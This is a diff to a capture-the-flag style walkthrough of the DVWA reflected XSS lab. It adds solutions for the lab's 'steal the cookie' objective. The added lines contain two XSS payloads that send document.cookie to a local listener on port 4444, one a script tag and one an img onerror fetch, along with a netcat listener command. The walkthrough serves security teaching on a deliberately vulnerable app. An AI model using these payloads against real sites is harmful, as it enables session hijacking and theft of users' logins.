@@ -55,6 +55,14 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 ```
 For this level, we have no restrictions implemented.
 
+Let's also solve the objective of the challenge, which is: `Steal the cookie of a logged in user.`.<br/>
+We can use the following payload: `<script>fetch('http://127.0.0.1:4444?cookie=' + btoa(document.cookie) );</script>`.
+This will send the cookie of the current user to the attacker address, in a base64 format. In order to listen for this message, we can start a listener with netcat: `nc -lvnp 4444`.
+
+<p align="center">
+  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/XSS(Reflected)/!images/xssr6.png?raw=true">
+</p>
+
 ## Medium Security
 For Medium level we have this filter implemented:
 ```php
@@ -72,7 +80,9 @@ For High level we have this filter implemented:
 $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
 ```
 Again, this is not a good implementation, because there are many XSS payloads that are not using the `<script>` tag.<br/>
-The challenge can be solved using: `"<img src=x onerror=alert('XSS')>`. This payload will trigger an error with alert box, if the source of the image is not found.
+The vulnerability can be executed using: `"<img src=x onerror=alert('XSS')>`. This payload will trigger an error with alert box, if the source of the image is not found.
+
+For the objective of the challenge, we can use a netcat listener on port 4444 and the following payload: `<img src=x onerror='fetch("http://127.0.0.1:4444/?cookie=" + document.cookie)'>`.
 
 ## Impossible Security
 Source code:
